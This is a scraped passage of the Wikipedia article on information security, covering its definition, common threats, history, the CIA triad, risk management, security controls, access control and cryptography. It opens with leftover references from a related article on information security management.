Tipton, H.F.; Krause, M. (2010). 
Information Security Management Handbook
. Vol. 3 (6th ed.). CRC Press. pp. 100–02. 
ISBN
 
9781420090956
.




^ 
a
 
b
 
Kim, D.; Solomon, M.G. (2016). 
Fundamentals of Information Systems Security
. Jones & Bartlett Learning. p. 225. 
ISBN
 
9781284128239
.




^
 
Leal, R. (7 March 2016). 
"ISO 27001 vs. ITIL: Similarities and differences"
. 
The ISO 27001 & ISO 22301 Blog
. Advisera Expert Solutions Ltd
. Retrieved 
16 June
 2018
.




^
 
White, S.K. (22 December 2017). 
"What is COBIT? A framework for alignment and governance"
. 
CIO
. IDG Communications, Inc
. Retrieved 
16 June
 2018
.




^
 
"Open Information Security Management Maturity Model (O-ISM3), Version 2.0"
. The Open Group. 21 September 2017
. Retrieved 
16 June
 2018
.






External links
[
edit
]


ISACA


The Open Group


Authority control databases
: National 
Japan










Retrieved from "
https://en.wikipedia.org/w/index.php?title=Information_security_management&oldid=1229070245
"


Categories
: 
Information management
Information technology management
Security
Hidden categories: 
CS1 errors: periodical ignored
Articles with short description
Short description is different from Wikidata











From Wikipedia, the free encyclopedia






Protecting information by mitigating risk




Information security
, sometimes shortened to 
infosec
,
[
1
]
 is the practice of protecting 
information
 by mitigating information risks. It is part of 
information risk management
.
[
2
]
[
3
]
 It typically involves preventing or reducing the probability of unauthorized or inappropriate access to 
data
 or the unlawful use, 
disclosure
, disruption, deletion, 
corruption
, modification, inspection, recording, or devaluation of information.
[
4
]
 It also involves actions intended to reduce the adverse impacts of such incidents. Protected information may take any form, e.g., electronic or physical, tangible (e.g., 
paperwork
), or intangible (e.g., 
knowledge
).
[
5
]
[
6
]
 Information security's primary focus is the balanced protection of 
data confidentiality
, 
integrity
, and 
availability
 (also known as the "CIA" triad) while maintaining a focus on efficient 
policy
 implementation, all without hampering organization 
productivity
.
[
7
]
 This is largely achieved through a structured 
risk management
 process that involves: 



Identifying information and related 
assets
, plus potential 
threats
, 
vulnerabilities
, and impacts;


Evaluating the risks


Deciding how to address or treat the risks, i.e., to avoid, mitigate, share, or accept them


Where risk mitigation is required, selecting or designing appropriate security controls and implementing them


Monitoring the activities and making adjustments as necessary to address any issues, changes, or improvement opportunities
[
8
]


To standardize this discipline, academics and professionals collaborate to offer guidance, policies, and industry standards on 
passwords
, 
antivirus software
, 
firewalls
, 
encryption software
, 
legal liability
, 
security awareness
 and training, and so forth.
[
9
]
 This 
standardization
 may be further driven by a wide variety of laws and regulations that affect how data is accessed, processed, stored, transferred, and destroyed.
[
10
]
 However, the implementation of any standards and guidance within an entity may have limited effect if a culture of 
continual improvement
 is not adopted.
[
11
]






Definition
[
edit
]


Information Security Attributes
: or qualities, i.e., 
Confidentiality
, 
Integrity
 and 
Availability
 (CIA). 
Information Systems
 are composed in three main portions, hardware, software and communications with the purpose to help identify and apply information security industry standards, as mechanisms of protection and prevention, at three levels or layers: 
physical
, personal and organizational. Essentially, procedures or policies are implemented to tell administrators, users and operators how to use products to ensure information security within the organizations.
[
12
]


Various definitions of information security are suggested below, summarized from different sources:



"Preservation of confidentiality, integrity and availability of information. Note: In addition, other properties, such as authenticity, accountability, non-repudiation and reliability can also be involved." (ISO/IEC 27000:2018)
[
13
]


"The protection of information and information systems from unauthorized access, use, disclosure, disruption, modification, or destruction in order to provide confidentiality, integrity, and availability." (CNSS, 2010)
[
14
]


"Ensures that only authorized users (confidentiality) have access to accurate and complete information (integrity) when required (availability)." (
ISACA
, 2008)
[
15
]


"Information Security is the process of protecting the intellectual property of an organisation."  (Pipkin, 2000)
[
16
]


"...information security is a risk management discipline, whose job is to manage the cost of information risk to the business." (McDermott and Geer, 2001)
[
17
]


"A well-informed sense of assurance that information risks and controls are in balance." (Anderson, J., 2003)
[
18
]


"Information security is the protection of information and minimizes the risk of exposing information to unauthorized parties." (Venter and Eloff, 2003)
[
19
]


"Information Security is a multidisciplinary area of study and professional activity which is concerned with the development and implementation of security mechanisms of all available types (technical, organizational, human-oriented and legal) in order to keep information in all its locations (within and outside the organization's perimeter) and, consequently, information systems, where information is created, processed, stored, transmitted and destroyed, free from threats.
[
20
]
 Threats to information and information systems may be categorized and a corresponding security goal may be defined for each category of threats.
[
21
]
 A set of security goals, identified as a result of a threat analysis, should be revised periodically to ensure its adequacy and conformance with the evolving environment.
[
22
]
 The currently relevant set of security goals may include: 
confidentiality, integrity, availability, privacy, authenticity & trustworthiness, non-repudiation, accountability and auditability.
" (Cherdantseva and Hilton, 2013)
[
12
]


Information and information resource security using telecommunication system or devices means protecting information, information systems or books from unauthorized access, damage, theft, or destruction (Kurose and Ross, 2010).
[
23
]


Overview
[
edit
]


At the core of information security is information assurance, the act of maintaining the confidentiality, integrity, and availability (CIA) of information, ensuring that 
information
 is not compromised in any way when critical issues arise.
[
24
]
 These issues include but are not limited to natural disasters, computer/server malfunction, and physical theft. While paper-based business operations are still prevalent, requiring their own set of information security practices, enterprise digital initiatives are increasingly being emphasized,
[
25
]
[
26
]
 with information assurance now typically being dealt with by information technology (IT) security specialists. These specialists apply information security to technology (most often some form of computer system). It is worthwhile to note that a 
computer
 does not necessarily mean a home desktop.
[
27
]
 A computer is any device with a 
processor
 and some memory. Such devices can range from non-networked standalone devices as simple as calculators, to networked mobile computing devices such as smartphones and tablet computers.
[
28
]
 IT security specialists are almost always found in any major enterprise/establishment due to the nature and value of the data within larger businesses.
[
29
]
 They are responsible for keeping all of the 
technology
 within the company secure from malicious cyber attacks that often attempt to acquire critical private information or gain control of the internal systems.
[
30
]
[
31
]


The field of information security has grown and evolved significantly in recent years.
[
32
]
 It offers many areas for specialization, including securing networks and allied 
infrastructure
, securing 
applications
 and 
databases
, 
security testing
, information systems 
auditing
, 
business continuity planning
, electronic record discovery, and 
digital forensics
.
[
33
]
 Information security professionals are very stable in their employment.
[
34
]
 As of 2013
[update]
 more than 80 percent of professionals had no change in employer or employment over a period of a year, and the number of professionals is projected to continuously grow more than 11 percent annually from 2014 to 2019.
[
35
]




Threats
[
edit
]


Information security 
threats
 come in many different forms.
[
36
]
[
37
]
 Some of the most common threats today are software attacks, theft of intellectual property, theft of identity, theft of equipment or information, sabotage, and information extortion.
[
38
]
[
39
]
 
Viruses
,
[
40
]
 
worms
, 
phishing attacks
, and 
Trojan horses
 are a few common examples of software attacks. The 
theft of intellectual property
 has also been an extensive issue for many businesses in the information technology (
IT
) field.
[
41
]
 
Identity theft
 is the attempt to act as someone else usually to obtain that person's personal information or to take advantage of their access to vital information through 
social engineering
.
[
42
]
[
43
]
 Theft of equipment or information is becoming more prevalent today due to the fact that most devices today are mobile,
[
44
]
 are prone to theft and have also become far more desirable as the amount of data capacity increases. 
Sabotage
 usually consists of the destruction of an organization's 
website
 in an attempt to cause loss of confidence on the part of its customers.
[
45
]
 Information extortion consists of theft of a company's property or information as an attempt to receive a payment in exchange for returning the information or property back to its owner, as with 
ransomware
.
[
46
]
 There are many ways to help protect yourself from some of these attacks but one of the most functional precautions is conduct periodical user awareness.
[
47
]
 The number one threat to any organisation are users or internal employees, they are also called insider threats.
[
48
]


Governments
, 
military
, 
corporations
, 
financial institutions
, 
hospitals
, non-profit organisations, and private 
businesses
 amass a great deal of confidential information about their employees, customers, products, research, and financial status.
[
49
]
 Should confidential information about a business's customers or finances or new product line fall into the hands of a competitor or a 
black hat hacker
, a business and its customers could suffer widespread, irreparable financial loss, as well as damage to the company's reputation.
[
50
]
 From a business perspective, information security must be balanced against cost; the 
Gordon-Loeb Model
 provides a mathematical economic approach for addressing this concern.
[
51
]


For the individual, information security has a significant effect on 
privacy
, which is viewed very differently in various 
cultures
.
[
52
]




Responses to threats
[
edit
]


Possible responses to a security threat or 
risk
 are:
[
53
]




reduce/mitigate – implement safeguards and countermeasures to eliminate vulnerabilities or block threats


assign/transfer – place the cost of the threat onto another entity or organization such as purchasing insurance or outsourcing


accept – evaluate if the cost of the countermeasure outweighs the possible cost of loss due to the threat
[
54
]


History
[
edit
]


Since the early days of communication, diplomats and military commanders understood that it was necessary to provide some mechanism to protect the confidentiality of correspondence and to have some means of detecting 
tampering
.
[
55
]
 
Julius Caesar
 is credited with the invention of the 
Caesar cipher
 c. 50 B.C., which was created in order to prevent his secret messages from being read should a message fall into the wrong hands.
[
56
]
 However, for the most part protection was achieved through the application of procedural handling controls.
[
57
]
[
58
]
 Sensitive information was marked up to indicate that it should be protected and transported by trusted persons, guarded and stored in a secure environment or strong box.
[
59
]
 As postal services expanded, governments created official organizations to intercept, decipher, read, and reseal letters (e.g., the U.K.'s Secret Office, founded in 1653
[
60
]
).

In the mid-nineteenth century more complex 
classification systems
 were developed to allow governments to manage their information according to the degree of sensitivity.
[
61
]
 For example, the British Government codified this, to some extent, with the publication of the 
Official Secrets Act
 in 1889.
[
62
]
 Section 1 of the law concerned espionage and unlawful disclosures of information, while Section 2 dealt with breaches of official trust.
[
63
]
 A public interest defense was soon added to defend disclosures in the interest of the state.
[
64
]
 A similar law was passed in India in 1889, The Indian Official Secrets Act, which was associated with the British colonial era and used to crack down on newspapers that opposed the Raj's policies.
[
65
]
 A newer version was passed in 1923 that extended to all matters of confidential or secret information for governance.
[
66
]
  By the time of the 
First World War
, multi-tier classification systems were used to communicate information to and from various fronts, which encouraged greater use of code making and breaking sections in diplomatic and military headquarters.
[
67
]
 Encoding became more sophisticated between the wars as machines were employed to scramble and unscramble information.
[
68
]


The establishment of 
computer security
 inaugurated the history of information security. The need for such appeared during 
World War II
.
[
69
]
 The volume of information shared by the Allied countries during the Second World War necessitated formal alignment of classification systems and procedural controls.
[
70
]
 An arcane range of markings evolved to indicate who could handle documents (usually officers rather than enlisted troops) and where they should be stored as increasingly complex safes and storage facilities were developed.
[
71
]
 The 
Enigma Machine
, which was employed by the Germans to encrypt the data of warfare and was successfully decrypted by 
Alan Turing
, can be regarded as a striking example of creating and using secured information.
[
72
]
 Procedures evolved to ensure documents were destroyed properly, and it was the failure to follow these procedures which led to some of the greatest intelligence coups of the war (e.g., the capture of 
U-570
[
72
]
).

Various 
mainframe computers
 were connected online during the 
Cold War
 to complete more sophisticated tasks, in a communication process easier than mailing 
magnetic tapes
 back and forth by computer centers. As such, the 
Advanced Research Projects Agency
 (ARPA), of the 
United States Department of Defense
, started researching the feasibility of a networked system of communication to trade information within the 
United States Armed Forces
. In 1968, the 
ARPANET
 project was formulated by 
Larry Roberts
, which would later evolve into what is known as the 
internet
.
[
73
]


In 1973, important elements of ARPANET security were found by internet pioneer 
Robert Metcalfe
 to have many flaws such as the: "vulnerability of password structure and formats; lack of safety procedures for 
dial-up connections
; and nonexistent user identification and authorizations", aside from the lack of controls and safeguards to keep data safe from unauthorized access. Hackers had effortless access to ARPANET, as phone numbers were known by the public.
[
74
]
 Due to these problems, coupled with the constant violation of computer security, as well as the exponential increase in the number of hosts and users of the system, "network security" was often alluded to as "network insecurity".
[
74
]




Poster promoting information security by the Russian 
Ministry of Defence


The end of the twentieth century and the early years of the twenty-first century saw rapid advancements in 
telecommunications
, computing 
hardware
 and 
software
, and data 
encryption
.
[
75
]
 The availability of smaller, more powerful, and less expensive computing equipment made 
electronic data processing
 within the reach of 
small business
 and home users.
[
76
]
 The establishment of Transfer Control Protocol/Internetwork Protocol (TCP/IP) in the early 1980s enabled different types of computers to communicate.
[
77
]
 These computers quickly became interconnected through the 
internet
.
[
78
]


The rapid growth and widespread use of electronic data processing and 
electronic business
 conducted through the internet, along with numerous occurrences of international 
terrorism
, fueled the need for better methods of protecting the computers and the information they store, process, and transmit.
[
79
]
 The academic disciplines of 
computer security
 and 
information assurance
 emerged along with numerous professional organizations, all sharing the common goals of ensuring the security and reliability of 
information systems
.
[
80
]




Basic principles
[
edit
]


Key concepts
[
edit
]


The "CIA" triad of 
c
onfidentiality, 
i
ntegrity, and 
a
vailability
 is at the heart of information security.
[
81
]
 (The members of the classic InfoSec triad—confidentiality, integrity, and availability—are interchangeably referred to in the literature as security attributes, properties, security goals, fundamental aspects, information criteria, critical information characteristics and basic building blocks.)
[
82
]
 However, debate continues about whether or not this triad is sufficient to address rapidly changing technology and business requirements, with recommendations to consider expanding on the intersections between availability and confidentiality, as well as the relationship between security and privacy.
[
24
]
 Other principles such as "accountability" have sometimes been proposed; it has been pointed out that issues such as 
non-repudiation
 do not fit well within the three core concepts.
[
83
]


The triad seems to have first been mentioned in a 
NIST
 publication in 1977.
[
84
]


In 1992 and revised in 2002, the 
OECD
's 
Guidelines for the Security of Information Systems and Networks
[
85
]
 proposed the nine generally accepted principles: 
awareness
, responsibility, response, ethics, democracy, risk assessment, security design and implementation, security management, and reassessment.
[
86
]
 Building upon those, in 2004 the 
NIST
's 
Engineering Principles for Information Technology Security
[
83
]
 proposed 33 principles. From each of these derived guidelines and practices.

In 1998, 
Donn Parker
 proposed an alternative model for the classic "CIA" triad that he called the 
six atomic elements of information
. The elements are 
confidentiality
, 
possession
, 
integrity
, 
authenticity
, 
availability
, and 
utility
. The merits of the 
Parkerian Hexad
 are a subject of debate amongst security professionals.
[
87
]


In 2011, 
The Open Group
 published the information security management standard 
O-ISM3
.
[
88
]
 This standard proposed an 
operational definition
 of the key concepts of security, with elements called "security objectives", related to 
access control
 (9), 
availability
 (3), 
data quality
 (1), compliance, and technical (4). In 2009, 
DoD
 
Software Protection Initiative
 
Archived
 2016-09-25 at the 
Wayback Machine
 released the 
Three Tenets of Cybersecurity
 
Archived
 2020-05-10 at the 
Wayback Machine
 which are System Susceptibility, Access to the Flaw, and Capability to Exploit the Flaw.
[
89
]
[
90
]
[
91
]
 Neither of these models are widely adopted.



Confidentiality
[
edit
]


In information security, 
confidentiality
 "is the property, that information is not made available or disclosed to unauthorized individuals, entities, or processes."
[
92
]
 While similar to "privacy," the two words are not interchangeable. Rather, confidentiality is a component of privacy that implements to protect our data from unauthorized viewers.
[
93
]
 Examples of confidentiality of electronic data being compromised include laptop theft, password theft, or sensitive emails being sent to the incorrect individuals.
[
94
]




Integrity
[
edit
]


In IT security, 
data integrity
 means maintaining and assuring the accuracy and completeness of data over its entire lifecycle.
[
95
]
 This means that data cannot be modified in an unauthorized or undetected manner.
[
96
]
 This is not the same thing as 
referential integrity
 in 
databases
, although it can be viewed as a special case of consistency as understood in the classic 
ACID
 model of 
transaction processing
.
[
97
]
 Information security systems typically incorporate controls to ensure their own integrity, in particular protecting the kernel or core functions against both deliberate and accidental threats.
[
98
]
 Multi-purpose and multi-user computer systems aim to compartmentalize the data and processing such that no user or process can adversely impact another: the controls may not succeed however, as we see in incidents such as malware infections, hacks, data theft, fraud, and privacy breaches.
[
99
]


More broadly, integrity is an information security principle that involves human/social, process, and commercial integrity, as well as data integrity. As such it touches on aspects such as credibility, consistency, truthfulness, completeness, accuracy, timeliness, and assurance.
[
100
]




Availability
[
edit
]


For any information system to serve its purpose, the information must be 
available
 when it is needed.
[
101
]
 This means the computing systems used to store and process the information, the 
security controls
 used to protect it, and the communication channels used to access it must be functioning correctly.
[
102
]
 
High availability
 systems aim to remain available at all times, preventing service disruptions due to power outages, hardware failures, and system upgrades.
[
103
]
 Ensuring availability also involves preventing 
denial-of-service attacks
, such as a flood of incoming messages to the target system, essentially forcing it to shut down.
[
104
]


In the realm of information security, availability can often be viewed as one of the most important parts of a successful information security program.
[
citation needed
]
 Ultimately end-users need to be able to perform job functions; by ensuring availability an organization is able to perform to the standards that an organization's stakeholders expect.
[
105
]
 This can involve topics such as proxy configurations, outside web access, the ability to access shared drives and the ability to send emails.
[
106
]
 Executives oftentimes do not understand the technical side of information security and look at availability as an easy fix, but this often requires collaboration from many different organizational teams, such as network operations, development operations, incident response, and policy/change management.
[
107
]
 A successful information security team involves many different key roles to mesh and align for the "CIA" triad to be provided effectively.
[
108
]




Non-repudiation
[
edit
]


In law, 
non-repudiation
 implies one's intention to fulfill their obligations to a contract. It also implies that one party of a transaction cannot deny having received a transaction, nor can the other party deny having sent a transaction.
[
109
]


It is important to note that while technology such as cryptographic systems can assist in non-repudiation efforts, the concept is at its core a legal concept transcending the realm of technology.
[
110
]
 It is not, for instance, sufficient to show that the message matches a digital signature signed with the sender's private key, and thus only the sender could have sent the message, and nobody else could have altered it in transit (
data integrity
).
[
111
]
 The alleged sender could in return demonstrate that the digital signature algorithm is vulnerable or flawed, or allege or prove that his signing key has been compromised.
[
112
]
 The fault for these violations may or may not lie with the sender, and such assertions may or may not relieve the sender of liability, but the assertion would invalidate the claim that the signature necessarily proves authenticity and integrity. As such, the sender may repudiate the message (because authenticity and integrity are pre-requisites for non-repudiation).
[
113
]




Risk management
[
edit
]


Main article: 
Risk management


Broadly speaking, risk is the likelihood that something bad will happen that causes harm to an informational asset (or the loss of the asset).
[
114
]
 A vulnerability is a weakness that could be used to endanger or cause harm to an informational asset. A threat is anything (man-made or 
act of nature
) that has the potential to cause harm.
[
115
]
 The likelihood that a threat will use a vulnerability to cause harm creates a risk. When a threat does use a vulnerability to inflict harm, it has an impact.
[
116
]
 In the context of information security, the impact is a loss of availability, integrity, and confidentiality, and possibly other losses (lost income, loss of life, loss of real property).
[
117
]


The 
Certified Information Systems Auditor
 (CISA) Review Manual 2006
 defines 
risk management
 as "the process of identifying 
vulnerabilities
 and 
threats
 to the information resources used by an organization in achieving business objectives, and deciding what 
countermeasures
,
[
118
]
 if any, to take in reducing risk to an acceptable level, based on the value of the information resource to the organization."
[
119
]


There are two things in this definition that may need some clarification. First, the 
process
 of risk management is an ongoing, iterative 
process
. It must be repeated indefinitely. The business environment is constantly changing and new 
threats
 and 
vulnerabilities
 emerge every day.
[
120
]
 Second, the choice of 
countermeasures
 (
controls
) used to manage risks must strike a balance between productivity, cost, effectiveness of the countermeasure, and the value of the informational asset being protected.
[
121
]
 Furthermore, these processes have limitations as security breaches are generally rare and emerge in a specific context which may not be easily duplicated.
[
122
]
 Thus, any process and countermeasure should itself be evaluated for vulnerabilities.
[
123
]
 It is not possible to identify all risks, nor is it possible to eliminate all risk. The remaining risk is called "residual risk".
[
124
]


A 
risk assessment
 is carried out by a team of people who have knowledge of specific areas of the business.
[
125
]
 Membership of the team may vary over time as different parts of the business are assessed.
[
126
]
 The assessment may use a subjective qualitative analysis based on informed opinion, or where reliable dollar figures and historical information is available, the analysis may use 
quantitative
 analysis.

Research has shown that the most vulnerable point in most information systems is the human user, operator, designer, or other human.
[
127
]
 The 
ISO/IEC 27002:2005
 Code of practice for 
information security management
 recommends the following be examined during a risk assessment:



security policy
,


organization
 of information security,


asset management
,


human resources
 security,


physical and 
environmental security
,


communications
 and operations management,


access control
,


information systems acquisition, development, and maintenance,


information security 
incident management
,


business continuity management


regulatory compliance.


In broad terms, the risk management process consists of:
[
128
]
[
129
]




Identification of assets and estimating their value. Include: people, buildings, hardware, software, data (electronic, print, other), supplies.
[
130
]


Conduct a 
threat assessment
. Include: Acts of nature, acts of war, accidents, malicious acts originating from inside or outside the organization.
[
131
]


Conduct a 
vulnerability assessment
, and for each vulnerability, calculate the probability that it will be exploited. Evaluate policies, procedures, standards, training, 
physical security
, 
quality control
, technical security.
[
132
]


Calculate the impact that each threat would have on each asset. Use qualitative analysis or quantitative analysis.
[
133
]


Identify, select and implement appropriate controls. Provide a proportional response. Consider productivity, cost effectiveness, and value of the asset.
[
134
]


Evaluate the effectiveness of the control measures. Ensure the controls provide the required cost effective protection without discernible loss of productivity.
[
135
]


For any given risk, management can choose to accept the risk based upon the relative low value of the asset, the relative low frequency of occurrence, and the relative low impact on the business.
[
136
]
 Or, leadership may choose to mitigate the risk by selecting and implementing appropriate control measures to reduce the risk. In some cases, the risk can be transferred to another business by buying insurance or outsourcing to another business.
[
137
]
 The reality of some risks may be disputed. In such cases leadership may choose to deny the risk.
[
138
]




Security controls
[
edit
]


Main article: 
security controls


Selecting and implementing proper security controls will initially help an organization bring down risk to acceptable levels.
[
139
]
 Control selection should follow and should be based on the risk assessment.
[
140
]
 Controls can vary in nature, but fundamentally they are ways of protecting the confidentiality, integrity or availability of information. 
ISO/IEC 27001
 has defined controls in different areas.
[
141
]
 Organizations can implement additional controls according to requirement of the organization.
[
142
]
 
ISO/IEC 27002
 offers a guideline for organizational information security standards.
[
143
]




Administrative
[
edit
]


Administrative controls (also called procedural controls) consist of approved written policies, procedures, standards, and guidelines. Administrative controls form the framework for running the business and managing people.
[
144
]
 They inform people on how the business is to be run and how day-to-day operations are to be conducted. Laws and regulations created by government bodies are also a type of administrative control because they inform the business.
[
145
]
 Some industry sectors have policies, procedures, standards, and guidelines that must be followed – the 
Payment Card Industry Data Security Standard
[
146
]
 (PCI DSS) required by 
Visa
 and 
MasterCard
 is such an example. Other examples of administrative controls include the corporate security policy, 
password policy
, hiring policies, and disciplinary policies.
[
147
]


Administrative controls form the basis for the selection and implementation of logical and physical controls. Logical and physical controls are manifestations of administrative controls, which are of paramount importance.
[
144
]




Logical
[
edit
]


Logical controls (also called technical controls) use software and data to monitor and control access to information and 
computing
 systems.
[
citation needed
]
 Passwords, network and host-based firewalls, network 
intrusion detection
 systems, 
access control lists
, and data encryption are examples of logical controls.
[
148
]


An important logical control that is frequently overlooked is the 
principle of least privilege
, which requires that an individual, program or system process not be granted any more access privileges than are necessary to perform the task.
[
149
]
 A blatant example of the failure to adhere to the principle of least privilege is logging into Windows as user Administrator to read email and surf the web. Violations of this principle can also occur when an individual collects additional access privileges over time.
[
150
]
 This happens when employees' job duties change, employees are promoted to a new position, or employees are transferred to another department.
[
151
]
 The access privileges required by their new duties are frequently added onto their already existing access privileges, which may no longer be necessary or appropriate.
[
152
]




Physical
[
edit
]


Physical controls monitor and control the environment of the work place and computing facilities.
[
153
]
 They also monitor and control access to and from such facilities and include doors, locks, heating and air conditioning, smoke and fire alarms, fire suppression systems, cameras, barricades, fencing, security guards, cable locks, etc. Separating the network and workplace into functional areas are also physical controls.
[
154
]


An important physical control that is frequently overlooked is separation of duties, which ensures that an individual can not complete a critical task by himself.
[
155
]
 For example, an employee who submits a request for reimbursement should not also be able to authorize payment or print the check.
[
156
]
 An applications programmer should not also be the 
server administrator
 or the 
database administrator
; these roles and responsibilities must be separated from one another.
[
157
]




Defense in depth
[
edit
]


The 
onion model
 of defense in depth


Main article: 
Defense in depth (computing)


Information security must protect information throughout its lifespan, from the initial creation of the information on through to the final disposal of the information.
[
158
]
 The information must be protected while in motion and while at rest. During its lifetime, information may pass through many different information processing systems and through many different parts of information processing systems.
[
159
]
 There are many different ways the information and information systems can be threatened. To fully protect the information during its lifetime, each component of the information processing system must have its own protection mechanisms.
[
160
]
 The building up, layering on, and overlapping of security measures is called "defense in depth."
[
161
]
 In contrast to a metal chain, which is famously only as strong as its weakest link, the defense in depth strategy aims at a structure where, should one defensive measure fail, other measures will continue to provide protection.
[
162
]


Recall the earlier discussion about administrative controls, logical controls, and physical controls. The three types of controls can be used to form the basis upon which to build a defense in depth strategy.
[
144
]
 With this approach, defense in depth can be conceptualized as three distinct layers or planes laid one on top of the other.
[
163
]
 Additional insight into defense in depth can be gained by thinking of it as forming the layers of an onion, with data at the core of the onion, people the next outer layer of the onion, and 
network security
, host-based security, and 
application security
 forming the outermost layers of the onion.
[
164
]
 Both perspectives are equally valid, and each provides valuable insight into the implementation of a good defense in depth strategy.
[
165
]




Classification
[
edit
]


An important aspect of information security and risk management is recognizing the value of information and defining appropriate procedures and protection requirements for the information.
[
166
]
 Not all information is equal and so not all information requires the same degree of protection.
[
167
]
 This requires information to be assigned a 
security classification
.
[
168
]
 The first step in information classification is to identify a member of senior management as the owner of the particular information to be classified. Next, develop a classification policy.
[
169
]
 The policy should describe the different classification labels, define the criteria for information to be assigned a particular label, and list the required 
security controls
 for each classification.
[
170
]


Some factors that influence which classification information should be assigned include how much value that information has to the organization, how old the information is and whether or not the information has become obsolete.
[
171
]
 Laws and other regulatory requirements are also important considerations when classifying information.
[
172
]
 The 
Information Systems Audit and Control Association
 (ISACA) and its 
Business Model for Information Security
 also serves as a tool for security professionals to examine security from a systems perspective, creating an environment where security can be managed holistically, allowing actual risks to be addressed.
[
173
]


The type of information security classification labels selected and used will depend on the nature of the organization, with examples being:
[
170
]




In the business sector, labels such as: Public, Sensitive, Private, Confidential.


In the government sector, labels such as: Unclassified, Unofficial, Protected, Confidential, Secret, Top Secret, and their non-English equivalents.
[
174
]


In cross-sectoral formations, the 
Traffic Light Protocol
, which consists of: White, Green, Amber, and Red.


In the personal sector, one label such as Financial. This includes activities related to managing money, such as online banking.
[
175
]


All employees in the organization, as well as business partners, must be trained on the classification schema and understand the required security controls and handling procedures for each classification.
[
176
]
 The classification of a particular information asset that has been assigned should be reviewed periodically to ensure the classification is still appropriate for the information and to ensure the security controls required by the classification are in place and are followed in their right procedures.
[
177
]




Access control
[
edit
]


Access to protected information must be restricted to people who are authorized to access the information.
[
178
]
 The computer programs, and in many cases the computers that process the information, must also be authorized.
[
179
]
 This requires that mechanisms be in place to control the access to protected information.
[
179
]
 The sophistication of the access control mechanisms should be in parity with the value of the information being protected; the more sensitive or valuable the information the stronger the control mechanisms need to be.
[
180
]
 The foundation on which access control mechanisms are built start with identification and 
authentication
.
[
181
]


Access control is generally considered in three steps: identification, 
authentication
, and 
authorization
.
[
182
]
[
94
]




Identification
[
edit
]


Identification is an assertion of who someone is or what something is. If a person makes the statement "Hello, my name is 
John Doe
" they are making a claim of who they are.
[
183
]
 However, their claim may or may not be true. Before John Doe can be granted access to protected information it will be necessary to verify that the person claiming to be John Doe really is John Doe.
[
184
]
 Typically the claim is in the form of a username. By entering that username you are claiming "I am the person the username belongs to".
[
185
]




Authentication
[
edit
]


Authentication is the act of verifying a claim of identity. When John Doe goes into a bank to make a withdrawal, he tells the 
bank teller
 he is John Doe, a claim of identity.
[
186
]
 The bank teller asks to see a photo ID, so he hands the teller his 
driver's license
.
[
187
]
 The bank teller checks the license to make sure it has John Doe printed on it and compares the photograph on the license against the person claiming to be John Doe.
[
188
]
 If the photo and name match the person, then the teller has authenticated that John Doe is who he claimed to be. Similarly, by entering the correct password, the user is providing evidence that he/she is the person the username belongs to.
[
189
]


There are three different types of information that can be used for authentication:
[
190
]
[
191
]




Something you know: things such as a PIN, a 
password
, or your mother's 
maiden name
[
192
]
[
193
]


Something you have: a driver's license or a magnetic 
swipe card
[
194
]
[
195
]


Something you are: 
biometrics
, including 
palm prints
, 
fingerprints
, 
voice prints
, and 
retina (eye) scans
[
196
]


Strong authentication requires providing more than one type of authentication information (two-factor authentication).
[
197
]
 The 
username
 is the most common form of identification on computer systems today and the password is the most common form of authentication.
[
198
]
 Usernames and passwords have served their purpose, but they are increasingly inadequate.
[
199
]
 Usernames and passwords are slowly being replaced or supplemented with more sophisticated authentication mechanisms such as 
time-based one-time password algorithms
.
[
200
]




Authorization
[
edit
]


After a person, program or computer has successfully been identified and authenticated then it must be determined what informational resources they are permitted to access and what actions they will be allowed to perform (run, view, create, delete, or change).
[
201
]
 This is called 
authorization
. Authorization to access information and other computing services begins with administrative policies and procedures.
[
202
]
 The policies prescribe what information and computing services can be accessed, by whom, and under what conditions. The access control mechanisms are then configured to enforce these policies.
[
203
]
 Different computing systems are equipped with different kinds of access control mechanisms. Some may even offer a choice of different access control mechanisms.
[
204
]
 The access control mechanism a system offers will be based upon one of three approaches to access control, or it may be derived from a combination of the three approaches.
[
94
]


The non-discretionary approach consolidates all access control under a centralized administration.
[
205
]
 The access to information and other resources is usually based on the individuals function (role) in the organization or the tasks the individual must perform.
[
206
]
[
207
]
 The discretionary approach gives the creator or owner of the information resource the ability to control access to those resources.
[
205
]
 In the mandatory access control approach, access is granted or denied basing upon the security classification assigned to the information resource.
[
178
]


Examples of common access control mechanisms in use today include 
role-based access control
, available in many advanced database management systems; simple 
file permissions
 provided in the UNIX and Windows operating systems;
[
208
]
 
Group Policy Objects
 provided in Windows network systems; and 
Kerberos
, 
RADIUS
, 
TACACS
, and the simple access lists used in many 
firewalls
 and 
routers
.
[
209
]


To be effective, policies and other security controls must be enforceable and upheld. Effective policies ensure that people are held accountable for their actions.
[
210
]
 The 
U.S. Treasury
's guidelines for systems processing sensitive or proprietary information, for example, states that all failed and successful authentication and access attempts must be logged, and all access to information must leave some type of 
audit trail
.
[
211
]


Also, the need-to-know principle needs to be in effect when talking about access control. This principle gives access rights to a person to perform their job functions.
[
212
]
 This principle is used in the government when dealing with difference clearances.
[
213
]
 Even though two employees in different departments have a 
top-secret clearance
, they must have a need-to-know in order for information to be exchanged. Within the need-to-know principle, network administrators grant the employee the least amount of privilege to prevent employees from accessing more than what they are supposed to.
[
214
]
 Need-to-know helps to enforce the confidentiality-integrity-availability triad. Need-to-know directly impacts the confidential area of the triad.
[
215
]




Cryptography
[
edit
]


Main article: 
Cryptography


Information security uses 
cryptography
 to transform usable information into a form that renders it unusable by anyone other than an authorized user; this process is called 
encryption
.
[
216
]
 Information that has been encrypted (rendered unusable) can be transformed back into its original usable form by an authorized user who possesses the 
cryptographic key
, through the process of decryption.
[
217
]
 Cryptography is used in information security to protect information from unauthorized or accidental disclosure while the 
information
 is in transit (either electronically or physically) and while information is in storage.
[
94
]


Cryptography provides information security with other useful applications as well, including improved authentication methods, message digests, digital signatures, 
non-repudiation
, and encrypted network communications.
[
218
]
 Older, less secure applications such as 
Telnet
 and 
File Transfer Protocol
 (FTP) are slowly being replaced with more secure applications such as 
Secure Shell
 (SSH) that use encrypted network communications.
[
219
]
 Wireless communications can be encrypted using protocols such as 
WPA/WPA2
 or the older (and less secure) 
WEP
. Wired communications (such as 
ITU‑T
 
G.hn
) are secured using 
AES
 for encryption and 
X.1035
 for authentication and key exchange.
[
220
]
 Software applications such as 
GnuPG
 or 
PGP
 can be used to encrypt data files and email.
[
221
]


Cryptography can introduce security problems when it is not implemented correctly.
[
222
]
 Cryptographic solutions need to be implemented using industry-accepted solutions that have undergone rigorous peer review by independent experts in cryptography.
[
223
]
